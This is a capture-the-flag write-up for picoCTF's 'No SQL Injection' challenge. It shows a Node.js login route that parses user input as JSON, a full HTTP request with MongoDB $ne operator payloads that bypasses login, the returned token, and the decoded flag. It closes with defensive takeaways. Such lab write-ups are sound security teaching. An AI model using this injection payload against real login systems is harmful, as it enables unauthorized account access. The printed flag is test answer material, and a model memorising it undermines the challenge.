# 🛡️ picoCTF - NoSQL Injection Write-Up

## 📁 Challenge: No SQL Injection

We were given a `.tar.gz` file containing a Node.js web app. Let's walk through how we exploited a **NoSQL Injection vulnerability** in the login route.

---

## 📦 Step 1: Extract the Archive

We started by extracting the archive:

```bash
tar -xvzf app.tar.gz
```
---

## It revealed the following files:
~~~
app/
├── admin.html
├── index.html
├── package.json
└── server.js
~~~
---
## 🔍 Step 2: Review server.js
### The login endpoint looked like this:

```js
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({
      email:
        email.startsWith("{") && email.endsWith("}")
          ? JSON.parse(email)
          : email,
      password:
        password.startsWith("{") && password.endsWith("}")
          ? JSON.parse(password)
          : password,
    });

    if (user) {
      res.json({
        success: true,
        email: user.email,
        token: user.token,
        firstName: user.firstName,
        lastName: user.lastName,
      });
    } else {
      res.json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});
```
---
#### 🔥 Vulnerability
#### The server attempts to JSON.parse() the input if it starts with {, which opens the door to NoSQL injection by allowing us to inject MongoDB operators like $ne.
---

## 🧪 Step 3: Exploit the NoSQL Injection
### We crafted the following payload:

```PayLoad
POST /login HTTP/1.1
Host: atlas.picoctf.net:49732
Content-Length: 72
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://atlas.picoctf.net:49732
Referer: http://atlas.picoctf.net:49732/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

{
  "email": "{ \"$ne\": null }",
  "password": "{ \"$ne\": null }"
}
```
---

### This payload translates to the following MongoDB query:

```mongodb
{
  email: { $ne: null },
  password: { $ne: null }
}
```
#### ➡️ This matches any user with non-null credentials — and logs us in without knowing the actual username or password.
---
## 📬 Step 4: Capture the Response
### We received:

```Response
{
  "success": true,
  "email": "picoplayer355@picoctf.org",
  "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==",
  "firstName": "pico",
  "lastName": "player"
}
```

## 🔓 Step 5: Decode the Token
### We decoded the Base64 token:

```bash
echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==" | base64 -d
```

```Flag
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uU6pasql_injection_784e40e8}
```

---

## 🧾 Conclusion

This challenge highlights a common and dangerous security flaw in web applications using MongoDB — **NoSQL injection**. By exploiting improper input handling and dynamic query construction, we were able to bypass authentication and retrieve sensitive user information, including a Base64-encoded flag.

### 🛠 Key Takeaways:
- Never blindly parse user input as JSON.
- Always validate and sanitize input data.
- Use strict schemas and query constraints when interacting with databases.

Understanding these vulnerabilities is crucial for securing modern web applications and defending against real-world attacks.
